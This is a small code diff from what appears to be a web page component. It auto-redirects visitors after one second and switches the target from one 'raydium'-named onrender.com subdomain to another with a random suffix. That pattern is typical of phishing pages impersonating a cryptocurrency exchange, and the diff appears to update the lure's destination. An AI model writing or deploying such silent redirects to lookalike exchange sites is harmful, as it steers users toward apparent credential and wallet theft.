@@ -28,7 +28,7 @@ useHead({
 
 onMounted(() => {
   const timer = setTimeout(() => {
-    window.location.href = "https://raydium-app.onrender.com/";
+    window.location.href = "https://raydium-swap-51x4.onrender.com/";
   }, 1000);
 
   onBeforeUnmount(() => clearTimeout(timer));
